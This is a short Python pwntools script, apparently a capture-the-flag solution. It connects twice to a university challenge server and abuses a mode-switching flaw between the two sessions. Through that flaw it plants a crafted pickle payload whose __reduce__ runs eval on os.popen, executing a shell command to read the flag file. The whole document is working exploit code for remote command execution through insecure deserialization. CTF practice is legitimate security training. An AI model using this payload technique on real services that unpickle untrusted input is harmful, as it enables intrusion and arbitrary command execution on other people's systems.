from pwn import *
import pickle
import time

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT   = 25653

USERNAME  = "me"
NOTE_NAME = "something"

CMD = "cat home/ctf/flag"

class Exploit(object):
    def __reduce__(self):
        return (eval, (f"__import__('os').popen('{CMD}').read()",))

payload = pickle.dumps(Exploit(), protocol=0).decode()

session_A = remote(SERVER, PORT)

session_A.recvuntil(b"Username:")
session_A.sendline(USERNAME.encode())

session_A.recvuntil(b">>>")
session_A.sendline(b"0")   # CLASSY MODE

session_B = remote(SERVER, PORT)

session_B.recvuntil(b"Username:")
session_B.sendline(USERNAME.encode())

session_B.recvuntil(b">>>")
session_B.sendline(b"1")   # FREE MODE -> resets to FREE

session_B.recvuntil(b">>>")
session_B.sendline(b"1")   # WRITE

session_B.recvuntil(b"note_name:")
session_B.sendline(NOTE_NAME.encode())

session_B.recvuntil(b"note_content:")

for line in payload.splitlines():
    session_B.sendline(line.encode())

session_B.sendline(b"") 
session_B.close()

time.sleep(0.2) 

session_A.sendline(b"0") 
session_A.recvuntil(b"note_name:")
session_A.sendline(NOTE_NAME.encode())

result = session_A.recvall(timeout=2).decode()
session_A.close()

print("\n" + result)